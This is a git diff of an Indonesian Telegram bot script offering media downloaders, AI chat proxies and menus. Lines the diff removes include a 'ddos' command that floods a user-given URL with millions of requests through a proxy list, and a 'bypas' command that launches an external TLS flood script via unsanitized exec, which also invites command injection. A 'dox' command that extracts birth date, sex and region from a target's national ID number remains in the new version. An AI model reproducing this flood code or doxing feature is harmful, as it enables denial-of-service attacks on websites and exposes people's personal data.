@@ -1,6 +1,6 @@
 /*
      Recode By Alfi
-     Original Script By Rafael
+     Powered By Rafael
      Base by Zeeone
      thanks to wannoffc
 */
@@ -41,11 +41,14 @@ const {toFirstCase,
 const chalk = require('chalk')
 const fs = require('fs')
 const fetch = require('node-fetch')
+const FileType = require('file-type')
 const os = require('os')
 const speed = require('performance-now')
 const util = require('util')
 const yts = require('yt-search')
-const axios = require('axios');
+const axios = require('axios')
+const cheerio = require('cheerio')
+const FormData = require('form-data')
 const {
     simple
 } = require('./lib/myfunc')
@@ -143,139 +146,7 @@ function generateRandomPassword() {
   return password;
 }       
    
-const formats = ["audio", "video"];
-const audioQuality = [320, 256, 192, 128, 64];
-const videoQuality = ["360p", "480p", "720p", "1080p"];
 
-const bigconv = {
- getToken: async (url) => {
- const extractVideoId = (url) => {
- const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
- const match = url.match(regex);
- return match ? match[1] : null;
- };
-
- const id = extractVideoId(url);
- if (!id) {
- throw new Error('ID videonya gk ketemu jir, pastikan link youtube yak');
- }
-
- const config = {
- method: 'GET',
- url: `https://dd-n01.yt2api.com/api/v4/info/${id}`,
- headers: {
- 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
- 'Accept': 'application/json',
- 'accept-language': 'id-ID',
- 'referer': 'https://bigconv.com/',
- 'origin': 'https://bigconv.com',
- 'alt-used': 'dd-n01.yt2api.com',
- 'sec-fetch-dest': 'empty',
- 'sec-fetch-mode': 'cors',
- 'sec-fetch-site': 'cross-site',
- 'priority': 'u=0',
- 'te': 'trailers'
- }
- };
-
- const response = await axios.request(config);
- const cookies = response.headers['set-cookie'];
- const processedCookie = cookies ? cookies[0].split(';')[0] : '';
- const authorization = response.headers['authorization'] || '';
- const result = { data: response.data, cookie: processedCookie, authorization };
- return result;
- },
- convert: async (url, format, quality) => {
- const data = await bigconv.getToken(url);
- const formats = data.data.formats;
-
- let token;
- if (format === "audio") {
- const audioOptions = formats.audio.mp3;
- const selectedAudio = audioOptions.find(option => option.quality === quality);
- if (selectedAudio) {
- token = selectedAudio.token;
- } else {
- throw new Error(`Kualitas audio ${quality} tidak tersedia.`);
- }
- } else if (format === "video") {
- const videoOptions = formats.video.mp4;
- const selectedVideo = videoOptions.find(option => option.quality === quality);
- if (selectedVideo) {
- token = selectedVideo.token;
- } else {
- throw new Error(`Kualitas video ${quality} tidak tersedia.`);
- }
- } else {
- throw new Error('Format tidak dikenali. Gunakan "audio" atau "video".');
- }
-
- const raw = JSON.stringify({ "token": token });
-
- const config = {
- method: 'POST',
- url: 'https://dd-n01.yt2api.com/api/v4/convert',
- headers: {
- 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
- 'Accept': 'application/json',
- 'Content-Type': 'application/json',
- 'accept-language': 'id-ID',
- 'referer': 'https://bigconv.com/',
- 'origin': 'https://bigconv.com',
- 'sec-fetch-dest': 'empty',
- 'sec-fetch-mode': 'cors',
- 'sec-fetch-site': 'cross-site',
- 'priority': 'u=0',
- 'te': 'trailers',
- 'Cookie': data.cookie,
- 'authorization': data.authorization
- },
- data: raw
- };
-
- const response = await axios.request(config);
- return { jobId: response.data.id, cookie: data.cookie, authorization: data.authorization };
- },
- download: async (url, format, quality) => {
- const { jobId, cookie, authorization } = await bigconv.convert(url, format, quality);
- return new Promise((resolve, reject) => {
- const checkStatus = async () => {
- const config = {
- method: 'GET',
- url: `https://dd-n01.yt2api.com/api/v4/status/${jobId}`,
- headers: {
- 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
- 'Accept': 'application/json',
- 'accept-language': 'id-ID',
- 'referer': 'https://bigconv.com/',
- 'origin': 'https://bigconv.com',
- 'sec-fetch-dest': 'empty',
- 'sec-fetch-mode': 'cors',
- 'sec-fetch-site': 'cross-site',
- 'priority': 'u=4',
- 'te': 'trailers',
- 'Cookie': cookie,
- 'authorization': authorization
- }
- };
-
- const response = await axios.request(config);
- console.log(response.data);
- if (response.data.status === 'completed') {
- clearInterval(interval);
- resolve(response.data);
- } else if (response.data.status === 'failed') {
- clearInterval(interval);
- resolve(response.data);
- } else {
- console.log('Status belum complete, wet iam cek lagi...');
- }
- };
-
- const interval = setInterval(checkStatus, 5000);
- });
- }
-};
                   
                        
                             
@@ -287,502 +158,12 @@ const bigconv = {
                                                                
         
         switch (command) {
-case "ddos":
-  {
-      if (!text) return reply('_send domain target_')
-        const SocksProxyAgent = require('socks-proxy-agent');
-          const HttpsProxyAgent = require('https-proxy-agent');
-            const userIP = 'myserver2.junn4.my.id'; // masukkan link panel tanpa https://
-              const targetUrl = text; // Ganti dengan URL tujuan yang sesuai
-                const proxyListFile = 'lib/proxy.txt'; // Nama file yang berisi daftar proxy
-                  const totalRequests = 5000000;
-                     const delay = 100;
-                  function readProxyList() {
-                try {
-              const data = fs.readFileSync(proxyListFile, 'utf8');
-            const lines = data.trim().split('\n');
-          return lines.map(line => line.trim());
-        } catch (error) {
-      console.error(`Gagal membaca daftar proxy: ${error}`);
-    return [];
-  }
-}
-
-  function sendRequest(target, agent, userIP) {
-    if (allowedIPs.includes(userIP)) {
-      axios.get(target, { httpAgent: agent }) // Menggunakan httpAgent untuk proxy SOCKS
-         .then((response) => {
-       
-        // Lakukan sesuatu dengan respons
-        }
-          )
-             .catch((error) => {
-        
-        // Tangani kesalahan
-                }
-                    );
-                } 
-             else 
-          {
-        console.error(`IP Mu Tidak Terdaftar`);
-      }
-    }
-  function sendRequests() {
-     const proxyList = readProxyList();
-       let currentIndex = 0;
-         function sendRequestUsingNextProxy() {
-             if (currentIndex < proxyList.length) {
-                const proxyUrl = proxyList[currentIndex];
-                    let agent;
-                        if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
-                             agent = new SocksProxyAgent(proxyUrl);
-                                 } 
-                                   else if (proxyUrl.startsWith('https')) 
-                                 {
-                             agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
-                        }
-
-                    sendRequest(targetUrl, agent, userIP);
-                 currentIndex++;
-                setTimeout(sendRequestUsingNextProxy, 0);
-             } 
-         else 
-       {
-     setTimeout(sendRequests, delay);
-  }
-    }
-       sendRequestUsingNextProxy();
-            }
-                 const allowedIPs = ['myserver2.junn4.my.id'];
-// Mendapatkan alamat IP pengguna
-            sendRequests();
-      reply('_menyerang_...')
-    }
-  break
 case 'runtime':{
     alfixd.deleteMessage().catch(() => {});
       reply(`Fiibotz Online ${runtime(process.uptime())}`)
     }
   break  
 
-case 'play': {
-if (!text) return m.reply('What Song Are You Looking For?')
-try {
-const search = await yts(text)
-const convert = search.all[0]
-
-if (!convert || convert === 0) {
- m.reply('The Song You Searched For Was Found')
-}
-
-        await reply('Sabar... sedang mencari!');
-        
-        // Mendapatkan data audio dari API
-        let Lepikk = await bigconv.download(convert.url,"video","360p")
-
-        // Mengirim audio beserta informasi detailnya
-        let infoLagu = `🎵 *Nama:* ${convert.title}\n📀 *Artis:* ${convert.author.name}\n⏱️ *Durasi:* ${convert.timestamp}\n👁️ *Dilihat:* ${convert.views}\n🔗 *Tautan:* ${convert.url}`;
-        await alfixd.replyWithAudio({ 
-                url: Lepikk.download,                        mimetype: 'audio/mp4', 
-            ptt: false 
-        } , {
-  caption: infoLagu
-     })
-    } catch (error) {
-        console.error(error);
-        reply('Terjadi kesalahan saat memproses permintaan.');
-        }
-    }           
-break;
-
-case 'bypas':{
-    if(!isCreator) return reply('[!] Developer Feature')
-     if (!q.includes(' ')) return reply('*Example* example.com [time] [rps] [threads]')
-     mm = args.join(' ')
-     m1 = mm.split(" ")[0];
-     m2 = mm.split(" ")[1]; 
-     m3 = mm.split(" ")[2];
-     m4 = mm.split(" ")[3];
-     const url = m1;
-     const time = m2;
-     const rps = m3;
-     const threads = m4;
-     const proxyListFile = 'lib/proxy.txt'
-     exec(`node lib/tls-arz.js ${url} ${time} ${rps} ${threads} ${proxyListFile}`, (error, stdout, stderr) => {
-     if (error) {
-          reply(`eror: ${Error}`);
-          return;
-        }
-        if (stderr) {
-          reply(`${stderr}`);
-          return;
-        }
-        reply(`${stdout}`);
-      });
-      console.log(`${proxyListFile}`)
-      reply(`*Attack Server*\n*• Method* : main.py\n*• Target* : ${m1}\n*• Time* : ${m2}\n*• Rps* : ${m3}\n*• Thread* : ${m4}\n*• Proxy* : proxy.txt\n\n`)
-    }
-  break
-  case 'pinterest':
-case 'pin':
-    if (!text) {
-        return reply('Contoh penggunaan:\n' + command + ' Violet Evergarden');
-    }
-    
-    reply('Tunggu sebentar...');
-    
-    try {
-        // Mendapatkan data dari API Pinterest
-        const { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(text)}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(text)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
-        
-        // Memetakan URL gambar
-        let results = data.resource_response.data.results.map(v => v.images.orig.url);
-        
-        // Memilih gambar secara acak
-        if (results.length > 0) {
-            let selectedImage = results[Math.floor(Math.random() * results.length)];
-            
-            // Mengirim gambar
-            await alfixd.replyWithPhoto(
-                { url: selectedImage },
-                { caption: 'DONE' }
-            );
-        } else {
-            reply('Maaf, tidak ada hasil ditemukan.');
-        }
-    } catch (error) {
-        console.error(error);
-        reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
-    }
-    break;
-  case 'listcase': {
-let { listCase } = require('./lib/scrapelistCase.js')
-reply(listCase())
-}
-break
-  
-//Ai
-case 'ai': {
-                if (!text) return reply('What is your question?')
-                const data1 = await fetchJson(`https://btch.us.kg/gptgo?text=${encodeURIComponent(text)}`)
-    const msgai = data1.result;
-reply(`${msgai}`)
-           }
-            break             
-case 'gemini': {
-                if (!text) return reply('What is your question?')
-                const gemini = await fetchJson(`https://btch.us.kg/gpt3?text=${encodeURIComponent(text)}`)
-    const msgai = gemini.result;
-reply(`${msgai}`)
-           }
-//=========================================\\======
-case 'blackboxai': {
-                if (!text) return reply('What is your question?')
-                let d = await fetchJson(`https://itzpire.com/ai/blackbox-ai?q=${encodeURIComponent(text)}`)
-                const alfixd = d.result
-                reply(alfixd)
-           }
-            break
-case "ssweb": {
-if (!q) return reply("[!] sertakan link")
-reply("[!] Mohon Tunggu Sedang Proses")
-  try { 
-  let anu = `https://api.vreden.my.id/api/ssweb?url=${encodeURIComponent(text)}&type=desktop`
-  alfixd.replyWithPhoto({
-        url: anu
-    }, {
-  caption: 'DONE SS WEB'
-     })
-	} catch {
-	  reply('yah Error kak laporankan ke owner agar di perbaiki')
-	}
-}
-break
-case 'text2image':
-case 'text2img': {
-if (!q) return reply('mana promt nya Kak')
-reply("mohon tunggu sebentar")
-	try {
-	let anu = `https://api.vreden.my.id/api/text2img?query=${encodeURIComponent(text)}`	
-	alfixd.replyWithPhoto({
-        url: anu
-    }, {
-  caption: 'DONE'
-     })
-	} catch {
-	  reply('yah Error kak laporankan ke owner agar di perbaiki')
-	}
-}
-break
-case 'dalle': {
-  if (!text) return reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
-  	try {
-	let nanod = `https://btch.us.kg/ai/text2img?text=${encodeURIComponent(text)}`
-	alfixd.replyWithPhoto({
-        url: nanod
-    }, {
-  caption: 'DONE'
-     })	
-	} catch {
-	  reply('yah Error kak laporankan ke owner agar di perbaiki')
-	}
-  }
-  break
-  
-  case 'lirik': {
-    if (!text) return reply('[!] Masukkan judul lagu');
-    const hasil = await fetchJson(`https://btch.us.kg/lirik?text=${encodeURIComponent(text)}`)
-    const thumb = hasil.result.image
-const lirikk = `
-*Title :* ${hasil.result.title}
-*Artis :* ${hasil.result.artist}
-*Url :* ${hasil.result.url}
-
-
-`
-    await alfixd.replyWithPhoto({
-    url: thumb,
-  }, {
-     caption: `${lirikk}`
-        }
-        )
-reply(`*Lyrics :* ${hasil.result.lyrics}`)        
-}
-break;
-
-case 'facebook':
-  case 'fb':{
-     if (!text) return reply('[!] link..!')
-        alfixd.deleteMessage().catch(() => {});
-            reply('[!] Wait Result...')
-  const data = await fetchJson(`https://btch.us.kg/download/fbdl?url=${encodeURIComponent(text)}`)
-                const videoBuffer = data.result.Normal_video;           
-        await alfixd.replyWithVideo({
-    url: videoBuffer,
-  }, {
-     caption: `DONE`
-        }
-        )
-     }
-  break
-  case 'ig': 
-  case 'instagram':{
-    if (!text) return reply('[!] link...!')
-            reply('[!] Wait Result...')
-                const data = await fetchJson(`https://btch.us.kg/download/igdl?url=${encodeURIComponent(text)}`);
-    if (data && data.result && data.result.length > 0 && data.result[0].url) {
-        const hasil = data.result[0].url;
-                    await alfixd.replyWithVideo({
-                url: hasil,
-                   }, {
-                caption: `[ INSTAGRAM DOWNLOAD V1 ]
-    SCRIPT BY: FIIBOTZ            `
-            }
-        )
-    }
-    }
-  break
-
-
-case 'tiktok': {
-if (!text) return reply('[!] link...!')
-            reply('[!] Wait Result...')
-   let anu = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)   
-   const vidnya = anu.video.noWatermark
-   await alfixd.replyWithVideo({
-                url: vidnya,
-                   }, {
-                caption: `[ TIKTOK DOWNLOAD V1 ]
-   Caption: ${anu.title}
-   Likes: ${anu.stats.likeCount}
-   Comment: ${anu.stats.commentCount}    Share: ${anu.stats.shareCount}
-   Views: ${anu.stats.playCount}
-   
-SCRIPT BY FIIBOTZ`
-            }
-        )
-    }
-  break 
-        
-
-case 'yt': case 'youtube': case 'ytv': {
-  if (!text) return reply(' [ Example ] :*\n> *.yt <link youtube>*')
-  reply('*Process of sending video, may take 1-3 minutes if the video duration is too long!*')
-  let proces = await (await fetch(`https://btch.us.kg/download/ytdl?url=${text}`)).json()
-  let video4 = proces.result.mp4;
-  await alfixd.replyWithVideo({
-                url: video4,
-                   }, {
-                caption: `[ YOUTUBE DOWNLOAD ]
-                *title* ${proces.result.title}
-SCRIPT BY FIIBOTZ`
-            }
-        )
-    }
-  break 
-case 'listram': case 'ramlist':
-alfixd.deleteMessage().catch(() => {});
-let menuh = 
-`*Hi @${pushname} 👋*
-    
-▭▬▭( 𝐑𝐀𝐌 𝐘𝐀𝐍𝐆 𝐓𝐄𝐑𝐒𝐄𝐃𝐈𝐀 )▭▬▭
-• 1GB ( PREMIUM ) ✅
-• 2GB ( PREMIUM ) ✅
-• 3GB ( PREMIUM ) ✅
-• 4GB ( PREMIUM ) ✅
-• 5GB ( PREMIUM ) ✅
-• 6GB ( PREMIUM ) ✅
-• 7GB ( PREMIUM ) ✅
-• 8GB ( PREMIUM ) ✅
-• UNLI ( PREMIUM ) ✅
-▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: menuh,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-break            
-case 'nikparser': case 'dox':
-if (!isCreator) return reply("khusus alfixd")
-if (!q) return reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
-const { nikParser } = require('nik-parser')
-const ktp = q
-const nik = nikParser(ktp)
-reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
-break
-
-case "menudownload": {
-let wkwkw = `▧ Download Menu
-│ • ${prefix}tiktok
-│ • ${prefix}instagram
-│ • ${prefix}facebook
-│ • ${prefix}play
-│ • ${prefix}pinterest 
-│ • ${prefix}youtube
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: wkwkw,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
-case "menuai": {
-let wkwk = `▧  Ai Menu
-│ • ${prefix}ai
-│ • ${prefix}gemini
-│ • ${prefix}blackboxai
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: wkwk,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
-case "menuimage": {
-let yahaha = `▧ ImageCreate Menu
-│ • ${prefix}txt2img
-│ • ${prefix}dalle
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: yahaha,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
-case "menuddos": {
-let komtol = `▧ DDoS Menu
-│ • ${prefix}ddos
-│ • ${prefix}dos
-│ • ${prefix}mix
-│ • ${prefix}bypass
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: komtol,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
-case "menucpanel": {
-let ngen = `▧ CreatePanel Menu
-│ • ${prefix}1gb
-│ • ${prefix}2gb
-│ • ${prefix}3gb
-│ • ${prefix}4gb
-│ • ${prefix}5gb
-│ • ${prefix}6gb
-│ • ${prefix}7gb
-│ • ${prefix}8gb
-│ • ${prefix}unli
-│ • ${prefix}listsrv
-│ • ${prefix}listadmin
-│ • ${prefix}createadmin
-│ • ${prefix}cekid
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: ngen,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
-case "menuinstallpanel": {
-let ngentod = `▧ InstallPanel Menu
-│ • ${prefix}installpanel
-│ • ${prefix}installwings
-└───···`
-alfixd.replyWithPhoto(
-        global.pp, {
-            caption: ngentod,
-    reply_markup: {
-      keyboard: [
-        [{ text: 'next' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true 
-    }
-        })
-}
-break
 case 'menu': case 'back!': case 'start':
 const totalMem = os.totalmem();
 const freeMem = os.freemem();
@@ -797,23 +178,43 @@ let poke =
 ▧  Info Bot
 │ • BotName: ${BOT_NAME}
 │ • OwnerName: ${OWNER_NAME}
-│ • Info : Case
+│ • Type : Case
 │ • Library : telegraf
 │ • RAM : ${formattedUsedMem} / ${formattedTotalMem}
 │ • Date : ${new Date().toLocaleString()}
+│ • Runtime : ${runtime(process.uptime())}
 └───···
 ▧ List Menu
 │ • /menuai
 │ • /menudownload
-│ • /menuimage
-│ • /menuddos
-│ • /menucpanel
+│ • /menuother
 └───···
 
-Original Script || By Fiibotz`
+Powered || By AlfiXD`
 alfixd.replyWithPhoto(
         global.pp, {
             caption: poke,
+    reply_markup: {
+        inline_keyboard: [
+          [{ text: 'OWNER', url: 'https://t.me/alfisyahrial' }]
+        ]
+      }
+        })
+break  
+
+case "menudownload": {
+let wkwkw = `▧ Download Menu
+│ • ${prefix}tiktok
+│ • ${prefix}instagram
+│ • ${prefix}facebook
+│ • ${prefix}play
+│ • ${prefix}pinterest 
+│ • ${prefix}youtube
+│ • ${prefix}spotifydl
+└───···`
+alfixd.replyWithPhoto(
+        global.pp, {
+            caption: wkwkw,
     reply_markup: {
       keyboard: [
         [{ text: 'next' }]
@@ -822,7 +223,573 @@ alfixd.replyWithPhoto(
       resize_keyboard: true 
     }
         })
-break  
+}
+break
+
+case "menuai": {
+let wkwk = `▧  Ai Menu
+│ • ${prefix}ai
+│ • ${prefix}gemini
+│ • ${prefix}txt2img
+│ • ${prefix}dalle
+└───···`
+alfixd.replyWithPhoto(
+        global.pp, {
+            caption: wkwk,
+    reply_markup: {
+      keyboard: [
+        [{ text: 'next' }]
+      ],
+      one_time_keyboard: true,
+      resize_keyboard: true 
+    }
+        })
+}
+break
+
+case "menuother": {
+let Y = `▧ Other Menu
+│ • ${prefix}nikparser
+│ • ${prefix}ssweb
+│ • ${prefix}lirik
+└───···`
+alfixd.replyWithPhoto(
+        global.pp, {
+            caption: Y,
+    reply_markup: {
+      keyboard: [
+        [{ text: 'next' }]
+      ],
+      one_time_keyboard: true,
+      resize_keyboard: true 
+    }
+        })
+}
+break
+
+case 'play': {
+if (!text) return reply('What Song Are You Looking For?')
+try {
+let search = await yts(text);
+let videoUrl = search.all[0].url;
+
+
+        await reply('wait... still searching!');
+        
+        // Mendapatkan data audio dari API
+let api = await fetch(`https://api.alfixd.my.id/api/ytdl?url=${videoUrl}&format=mp3`)
+const audioData = await api.json()
+if (audioData.status && audioData.result && audioData.result.type === 'audio') {
+let pepek = audioData.result.download_url
+        
+        // Mengirim audio beserta informasi detailnya
+        let infoLagu = `🎵 Title: ${search.all[0].title}\n📀 Artist: ${search.all[0].author.name}\n⏱️ Duration: ${search.all[0].timestamp}\n👁️ Viewed: ${search.all[0].views}\n🔗 Link: ${search.all[0].url}`;
+        await alfixd.replyWithAudio({ 
+                url: pepek,
+                filename: `${search.all[0].title}`,                        mimetype: 'audio/mp4', 
+            ptt: false 
+        } , {
+  caption: infoLagu
+     })
+     } else {
+            reply(`Gagal mengunduh audio`);
+        }
+    } catch (error) {
+        console.error(error);
+        reply('An error occurred while processing the request.');
+        }
+    }           
+break;
+
+case 'spotifydl': {
+    if (!text) {
+        return reply(`Masukkan URL Spotify.\nContoh: .spotifydl https://open.spotify.com/track/2Tp8vm7MZIb1nnx1qEGYv5`);
+    }
+
+    await reply('Wait... still downloading!');
+
+    try {
+        // URL API untuk Spotify downloader
+        const apiUrl = `https://api.alfixd.my.id/api/spotifydl?url=${encodeURIComponent(text)}`;
+        const res = await fetch(apiUrl);
+    const response = await res.json();
+
+    if (response.status && response.result) {
+      const { title, artist, image, download } = response.result;
+
+      // Buat caption dengan informasi lagu
+      let cap = `┌───〔 SPOTIFY DOWNLOADER 〕
+│ Judul   : ${title}
+│ Artis   : ${artist}
+└───────────────`;
+        // Kirimkan file audio ke Telegram
+        await alfixd.replyWithAudio(
+            {
+                filename: `${title || 'audio'}.mp3`,
+                mimetype: 'audio/mpeg',
+                ptt: false,
+            },
+            {
+                caption: cap,
+            }
+        );
+    } else {
+      reply(`Gagal mengunduh lagu dari Spotify`);
+    }
+    } catch (error) {
+        console.error('Error:', error);
+        reply('An error occurred while processing the request.');
+    }
+}
+break;
+
+  case 'pinterest':
+case 'pin':
+    if (!text) {
+        return reply('Usage examples:\n' + command + ' Violet Evergarden');
+    }
+    
+    reply('Wait a moment...');
+    
+        // Mendapatkan data dari API Pinterest
+        let url = `https://api.alfixd.my.id/api/pinterest?q=${encodeURIComponent(text)}`;
+    try {
+        const res = await fetch(url);
+        const response = await res.json();
+
+        // Pastikan respons adalah array 'results' dan tidak kosong
+        if (response.status === 200 && response.results && Array.isArray(response.results) && response.results.length > 0) {
+            // Pilih satu gambar secara acak dari array hasil
+            const randomImage = response.results[Math.floor(Math.random() * response.results.length)];
+            const { upload_by, caption, image, source } = randomImage;
+
+            // Buat caption untuk gambar
+            let imageCaption = `┌───〔 PINTEREST IMAGE 〕
+│ Upload By : ${upload_by || 'N/A'}
+│ Caption   : ${caption || 'Tidak ada'}
+│ Source    : ${source || 'N/A'}
+└───────────────`;
+            
+            // Mengirim gambar
+            await alfixd.replyWithPhoto(
+                { url: image },
+                { caption: imageCaption }
+            );
+        } else {
+            reply('Sorry, no results found.');
+        }
+    } catch (error) {
+        console.error(error);
+        reply('An error occurred while retrieving data. Please try again later..');
+    }
+    break;
+    
+  case 'listcase': {
+let { listCase } = require('./lib/scrapelistCase.js')
+reply(listCase())
+}
+break
+  
+//Ai
+case 'ai': {
+                if (!text) return reply('What is your question?')
+                const gpt = await fetchJson(`https://api.alfixd.my.id/api/gemini?text=${encodeURIComponent(text)}`)
+    const msgai = gpt.jawaban;
+reply(`${msgai}`)
+           }
+            break             
+            
+case 'gemini': {
+                if (!text) return reply('What is your question?')
+                const gemini = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=kamu%20adalah%20ai%20yang%20ceria&content=${encodeURIComponent(text)}`)
+    const msgai = gemini.data;
+reply(`${msgai}`)
+           }
+//=========================================\\======
+case 'ssweb': {
+if (!q) return reply("[!] include link")
+reply("[!] Mohon Tunggu Sedang Proses")
+  try { 
+  let anu = `https://api.vreden.my.id/api/ssweb?url=${encodeURIComponent(text)}&type=desktop`
+  alfixd.replyWithPhoto({
+        url: anu
+    }, {
+  caption: 'DONE SS WEB'
+     })
+	} catch {
+	  reply('there is an error, please report it to the owner so it can be fixed.')
+	}
+}
+break
+
+case 'text2image':
+case 'text2img': {
+if (!q) return reply('where is the prompt?')
+reply("mohon tunggu sebentar")
+	try {
+	let anu = await fetchJson(`https://api.vreden.my.id/api/artificial/amazonai?prompt${encodeURIComponent(text)}&frame=6`)	
+	alfixd.replyWithPhoto({
+        url: anu.result.image_link
+    }, {
+  caption: 'DONE'
+     })
+	} catch {
+	  reply('Error, please report it to the owner so it can be fixed.')
+	}
+}
+break
+
+case 'dalle': {
+  if (!text) return reply(`This command generates images from text prompts\n\n𝙴xample usage\n${prefix + command} Beautiful anime girl\n${prefix + command} girl in pink dress`)
+  	try {
+	let nanod = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(text)}`
+	alfixd.replyWithPhoto({
+        url: nanod
+    }, {
+  caption: 'DONE'
+     })	
+	} catch {
+	  reply('Error, please report it to the owner so it can be fixed.')
+	}
+  }
+  break
+  
+  case 'lirik': {
+    if (!text) return reply('[!] Enter song title');
+    const res = await axios.get(`https://fastrestapis.fasturl.cloud/music/songlyrics-v1?text=${encodeURIComponent(text)}`);
+        const data = res.data;
+
+        // Periksa apakah respons berhasil
+        if (data.status !== 200 || !data.result || !data.result.answer) {
+            return m.reply('Lagu tidak ditemukan atau gagal mengambil data.');
+        }
+
+        // Ambil data dari respons
+        const {
+            answer
+        } = data.result;
+        const {
+            song,
+            artist,
+            album,
+            plain_lyrics,
+            genre,
+            year,
+            Youtube_URL,
+            album_artwork_url,
+            preview_audio_url,
+            related_songs,
+        } = answer;
+
+        // Format respons
+        let response = `🎵 *${song || 'Judul tidak diketahui'}* - ${artist || 'Artis tidak diketahui'}\n`;
+        if (album) response += `💿 Album: ${album}\n`;
+        if (genre) response += `🎼 Genre: ${genre}\n`;
+        if (year) response += `📅 Tahun: ${year}\n`;
+        if (Youtube_URL) response += `📹 YouTube: ${Youtube_URL}\n`;
+
+        /*blok lirik ini supaya ga error long message 
+        response += `\n📜 *Lirik:*\n${plain_lyrics || 'Lirik tidak tersedia.'}`;*/
+
+    await alfixd.replyWithPhoto({
+    url: album_artwork_url
+  }, {
+     caption: response
+        }
+        )
+        // send lirik disini ( terpisah agar tidak error long message )
+reply(`📜 *Lirik:*\n${plain_lyrics || 'Lirik tidak tersedia.'}`)        
+}
+break;
+
+case 'facebook': {
+    if (!text) return reply('Masukkan link Facebook!');
+
+    reply('🔍 Sedang memproses permintaan...');
+
+    try {
+        const apiUrl = `https://api-02.ryzumi.vip/api/downloader/fbdl?url=${encodeURIComponent(text)}`;
+        const res = await axios.get(apiUrl);
+        const json = res.data;
+
+        if (json.status && Array.isArray(json.data) && json.data.length > 0) {
+            let videoData = json.data.find(v => v.resolution.toLowerCase().includes('720p')) || json.data[0];
+            const videoUrl = videoData.url;
+            const resolution = videoData.resolution;
+            const title = json.title || 'Facebook Video';
+            const caption = `*🎥 Facebook Video Downloaded*\n\n📌 *Judul:* ${title}\n🔗 *Link:* ${text}\n🎞️ *Kualitas:* ${resolution}`;
+
+            try {
+                // Kirim langsung via URL
+                await alfixd.replyWithVideo({
+                    url: videoUrl
+                }, {
+                    caption,
+                    parse_mode: 'Markdown'
+                });
+            } catch (e) {
+                console.warn('[!] Gagal kirim via URL, fallback ke buffer...');
+                const videoRes = await axios.get(videoUrl, { responseType: 'arraybuffer' });
+                const videoBuffer = Buffer.from(videoRes.data);
+
+                await alfixd.replyWithVideo({
+                    source: videoBuffer
+                }, {
+                    caption,
+                    parse_mode: 'Markdown'
+                });
+            }
+        } else {
+            reply('❌ Gagal mengambil data video. Coba pakai link lain.');
+        }
+    } catch (err) {
+        console.error('[FB ERROR]', err);
+        reply('❌ Terjadi kesalahan saat mengambil video. Cek kembali link yang diberikan.');
+    }
+    }
+    break;
+
+  case 'twitterdl':
+  case 'twitter':{
+     if (!text) return reply('[!] link..!')
+        alfixd.deleteMessage().catch(() => {});
+            reply('[!] Wait Result...')
+    let url = `https://api.alfixd.my.id/api/twitterdl?url=${encodeURIComponent(text)}`;
+  try {
+    const res = await fetch(url);
+    const response = await res.json();
+
+    if (response.status === 200 && response.download_link && response.download_link.length > 0) {
+      const downloadUrl = response.download_link[0];  
+        await alfixd.replyWithVideo({
+    url: downloadUrl,
+  }, {
+     caption: `Downloaded from Twitter/X\nSource: ${response.source || 'N/A'}`
+        }
+        )
+         } else {
+      reply(`Failed to download from Twitter/X`);
+    }
